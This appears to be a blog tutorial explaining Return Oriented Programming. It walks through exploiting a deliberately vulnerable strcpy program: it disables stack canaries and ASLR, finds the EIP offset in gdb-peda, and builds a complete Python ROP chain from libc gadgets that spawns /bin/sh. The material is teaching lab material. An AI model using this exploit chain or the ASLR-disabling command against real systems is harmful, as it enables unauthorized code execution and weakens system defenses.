I"]<p align="center"><i>Birds Eye View and the Deep Dive Series</i></p>

<h1 id="birds-eye-view">Birds Eye View</h1>
<blockquote>
  <p><strong><em>The main idea of Return Oriented Programming (ROP) is to chain and run the instructions which are already present in the code to the attackers advantage.</em></strong></p>
</blockquote>

<h3 id="getting-to-know-buffer-overflows">Getting to know Buffer Overflows</h3>

<p>In buffer overflow vulnerabilities, one of the most common methods used by attackers is to write the shellcode onto the stack and then to execute it. The execution of the shellcode is achieved by controlling the EIP, and pointing it to the start of the shellcode. The buffer overflow attacks have targeted both stack and heap memory regions for exploiting these vulnerabilities.</p>

<blockquote>
  <p><strong><em>The key to successful buffer overflow attack is to control the Instruction Pointer (IP).</em></strong></p>
</blockquote>

<p>In order to mitigate the effect of the buffer overflow vulnerabilities we have following mitigation’s in place:</p>

<ul>
  <li><strong><em>Stack Canaries</em></strong>: This is a compiler level protection. These are inserted by the compilers at compile time into the binaries. Different compilers have different ways by which they accomplish it.</li>
  <li><strong><em>Data Execution Prevention (DEP)</em></strong>: This is supported at the hardware level by way of <code class="language-plaintext highlighter-rouge">NX</code> bit. Setting or unsetting this bit will make the address space executable or non-executable. We can control it through software.</li>
  <li><strong><em>Address Space Layout Randomization (ASLR)</em></strong>: Here we randomize the address space of various segments of the program, so that they don’t have fixed address which can be easily exploited by the malicious actors. ASLR can be enabled or disable at the operation system level. In linux we have additional features to control it at program level also.</li>
</ul>

<h3 id="where-do-the-rops-fit-in">Where do the ROPs fit in?</h3>
<p>In Return Oriented Programming (ROP) we chain the gadgets in such a way that we are able to obtain the shell (command prompt) on the vulnerable system. It is primarily used to bypass the DEP safeguards.</p>

<h3 id="and-what-do-you-mean-by-gadgets">And what do you mean by gadgets?</h3>
<p>Well, these are a group of instructions which end with <code class="language-plaintext highlighter-rouge">ret</code>. Some of the useful ROP gadgets are:</p>

<ul>
  <li>Loading constant into register <code class="language-plaintext highlighter-rouge">pop eax; ret</code></li>
  <li>Loading from memory <code class="language-plaintext highlighter-rouge">mov ebx, [eax]; ret</code></li>
  <li>Store in memory <code class="language-plaintext highlighter-rouge">mov [eax], ebx; ret</code></li>
  <li>Arithmetic operations <code class="language-plaintext highlighter-rouge">xor eax, eax; ret</code></li>
  <li>System calls <code class="language-plaintext highlighter-rouge">int 0x80; ret</code></li>
</ul>

<h1 id="deep-dive">Deep Dive</h1>
<p>Having the background lets try to take a deep dive and understand what the hullabaloo is about.</p>

<h3 id="our-objective-is-to-launch-binsh-shell">Our objective is to launch <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell</h3>

<p>We will make use of following steps:</p>
<ul>
  <li>Write <code class="language-plaintext highlighter-rouge">/bin/sh</code> string in memory</li>
  <li>Setup <code class="language-plaintext highlighter-rouge">execve</code> syscall number</li>
  <li>Setup <code class="language-plaintext highlighter-rouge">execve</code> arguments</li>
  <li>Syscall gadgets</li>
  <li>Find syscall interrupt</li>
  <li>Build the ROP chain as a python script</li>
</ul>

<h3 id="building-the-rop-chain">Building the ROP Chain</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">int execve(const char *filename, char *const argv[], char *const
envp[]);</code>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">pop ebx</code> - first argument</li>
      <li><code class="language-plaintext highlighter-rouge">pop ecx</code> - second argument</li>
      <li><code class="language-plaintext highlighter-rouge">pop edx</code> - third argument</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">xor eax, eax</code>
    <ul>
      <li>used to initialize the context to zero</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">inc eax</code>
    <ul>
      <li>used 11 times to setup the execve syscall number</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">int 0x80</code>
    <ul>
      <li>syscall exception</li>
    </ul>
  </li>
</ul>

<h3 id="example-exploitation">Example Exploitation</h3>
<p>Let’s take a vulnerable buffer overflow example code:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*rop.c*/
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int main(int argc,char *argv[]){
	char buf[10];
	strcpy(buf,argv[1]);
	printf("Buf:%s\n",buf);
	return 0;
}
</code></pre></div></div>
<h3 id="compiling-the-above-program">Compiling the above program</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc -ggdb -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -znoexecstack
rop.c -o rop
</code></pre></div></div>
<ul>
  <li><code class="language-plaintext highlighter-rouge">-m32</code>: For output in 32 bit binary format.</li>
  <li><code class="language-plaintext highlighter-rouge">ggdb</code>: Enable debug info.</li>
  <li><code class="language-plaintext highlighter-rouge">mpreferred-stack-boundary</code>: GCC will align stack pointer on <code class="language-plaintext highlighter-rouge">2^2=4byte</code> boundary.</li>
  <li><code class="language-plaintext highlighter-rouge">fno-stack-protector</code>: To disable stack canaries.</li>
  <li><code class="language-plaintext highlighter-rouge">znoexecstack</code>: Enable <code class="language-plaintext highlighter-rouge">NX</code> to make stack non executable</li>
</ul>

<h3 id="disable-aslr">Disable ASLR</h3>
<p>ASLR has following flags options</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">0</code>:  No Randomization</li>
  <li><code class="language-plaintext highlighter-rouge">1</code>: Conservative Randomization
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Shared libraries</code></li>
      <li><code class="language-plaintext highlighter-rouge">Stack</code></li>
      <li><code class="language-plaintext highlighter-rouge">Mmap</code></li>
      <li><code class="language-plaintext highlighter-rouge">VDSO</code></li>
      <li><code class="language-plaintext highlighter-rouge">Heap</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">2</code> Full Randomization
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Brk()</code></li>
    </ul>
  </li>
</ul>

<p>For ease of understanding let us switch off the ASLR:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre></div></div>
<h3 id="check-the-security-attributes-of-binary-using-gdb-peda">Check the security attributes of binary using <code class="language-plaintext highlighter-rouge">gdb-peda</code></h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb-peda -q ./rop
Reading symbols from ./rop...done.

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
</code></pre></div></div>
<h3 id="find-the-offset-to-eip">Find the offset to <code class="language-plaintext highlighter-rouge">EIP</code></h3>
<p>Now, let’s find the offset to the <code class="language-plaintext highlighter-rouge">EIP</code> in this program using <code class="language-plaintext highlighter-rouge">pattern_create</code> and <code class="language-plaintext highlighter-rouge">pattern_offset</code> commands:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ pattern_create 50 patt.txt
gdb-peda$ r $(cat patt.txt)
Stopped reason: SIGSEGV
0x2d414143 in ?? ()
gdb-peda$ pattern_offset 0x2d414143
759251267 found at offset: 18
</code></pre></div></div>
<h3 id="find-gadgets-and-build-the-rop-chain">Find gadgets and build the ROP chain</h3>
<p>We have to find the required gadgets from the <code class="language-plaintext highlighter-rouge">libc</code> library used by our program. In order to find the <code class="language-plaintext highlighter-rouge">libc</code> version, load the program in <code class="language-plaintext highlighter-rouge">gdb-peda</code> and put a breakpoint at <code class="language-plaintext highlighter-rouge">main()</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ b main
</code></pre></div></div>
<p>Run the program and use <code class="language-plaintext highlighter-rouge">vmmap</code> to see the modules loaded by the program</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ vmmap
Start      End        Perm	Name
0x56555000 0x56556000 r-xp	/home/cdac/prac-examples/rop
0x56556000 0x56557000 r--p	/home/cdac/prac-examples/rop
0x56557000 0x56558000 rw-p	/home/cdac/prac-examples/rop
0xf7ddd000 0xf7fb2000 r-xp	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb2000 0xf7fb3000 ---p	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb3000 0xf7fb5000 r--p	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb5000 0xf7fb6000 rw-p	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb6000 0xf7fb9000 rw-p	mapped
0xf7fcf000 0xf7fd1000 rw-p	mapped
...
</code></pre></div></div>
<p>Here, we can see the version of <code class="language-plaintext highlighter-rouge">libc</code> that is getting loaded at runtime. <code class="language-plaintext highlighter-rouge">/lib/i386-linux-gnu/libc-2.27.so</code> is getting loaded at the base address of <code class="language-plaintext highlighter-rouge">0xf7ddd000</code>. We will now use the following command to search for gadgets and create a chain using <code class="language-plaintext highlighter-rouge">ROPGadget</code> tool</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ROPgadget --ropchain --binary /lib/i386-linux-gnu/libc-2.27.so &gt; ./gadgets.txt
</code></pre></div></div>
<p>The gadgets found will be saved in <code class="language-plaintext highlighter-rouge">gadgets.txt</code> file. At the end of the file we can see that a <code class="language-plaintext highlighter-rouge">python2</code> code will be generated for ROP chain to call <code class="language-plaintext highlighter-rouge">/bin/sh</code>. Let us have a peep inside this file</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Unique gadgets found: 118662

ROP chain generation
===========================================================
- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''
</code></pre></div></div>

<p>The addresses inside the ROP chain will be offsets inside the <code class="language-plaintext highlighter-rouge">libc.so</code> library. We have to add the base address that we have noted earlier. After adding the base address and the offset for the <code class="language-plaintext highlighter-rouge">EIP</code>, the python script will look as follows:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
# execve generated by ROPgadget
</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="c1"># Offset to EIP
</span><span class="n">p</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">18</span>
<span class="c1"># Add the base address of the libc.so library
</span><span class="n">base</span> <span class="o">=</span> <span class="mh">0xf7ddd000</span>

<span class="c1"># Put the address of .data section will be moved into edx register
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00001aae</span><span class="p">)</span> <span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8040</span><span class="p">)</span> <span class="c1"># @ .data
</span>
<span class="c1"># Address of '/bin' string into eax register
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024c1e</span><span class="p">)</span> <span class="c1"># pop eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'/bin'</span>

<span class="c1"># Mov '/bin' string to start of .data section
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00075655</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret
</span>
<span class="c1"># Mov '//sh' string to .data+4 section
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00001aae</span><span class="p">)</span> <span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8044</span><span class="p">)</span> <span class="c1"># @ .data + 4
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024c1e</span><span class="p">)</span> <span class="c1"># pop eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="s">'//sh'</span>
<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00075655</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret
</span>
<span class="c1"># Now, we have to give two more arguments to the execve() function, which can be null
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00001aae</span><span class="p">)</span> <span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8048</span><span class="p">)</span> <span class="c1"># @ .data + 8
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0002e565</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00075655</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret
</span>
<span class="c1"># First argument has to be in ebx
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00018c85</span><span class="p">)</span> <span class="c1"># pop ebx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8040</span><span class="p">)</span> <span class="c1"># @ .data
</span>
<span class="c1"># Second argument in ecx register which is null
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001926d5</span><span class="p">)</span> <span class="c1"># pop ecx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8048</span><span class="p">)</span> <span class="c1"># @ .data + 8
</span>
<span class="c1"># Third argument in edx register which is null
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00001aae</span><span class="p">)</span> <span class="c1"># pop edx ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001d8048</span><span class="p">)</span> <span class="c1"># @ .data + 8
</span>
<span class="c1"># Now, we have to place 11 in eax which is number of execve() system call
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0002e565</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00024bf8</span><span class="p">)</span> <span class="c1"># inc eax ; ret
</span>
<span class="c1"># Syscall exception
</span><span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00002d37</span><span class="p">)</span> <span class="c1"># int 0x80
</span>
<span class="k">print</span> <span class="n">p</span>
</code></pre></div></div>
<p>To this code we have added the offset to EIP offset which is 18 bytes and also the base address of <code class="language-plaintext highlighter-rouge">libc</code> library. Here the <code class="language-plaintext highlighter-rouge">pack</code> library is used to automatically reverse the address as per little endian format requirements.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./rop $(python rop-exploit.py)
Buf:AAAAAAAAAAAAAAAAAA����@P����
$ whoami
secure
$ id
uid=1000(secure) gid=1000(secure) groups=1000(secure)
</code></pre></div></div>
<p>Voila!! we have successfully executed the <code class="language-plaintext highlighter-rouge">/bin/sh</code> using ROP chain.</p>
:ET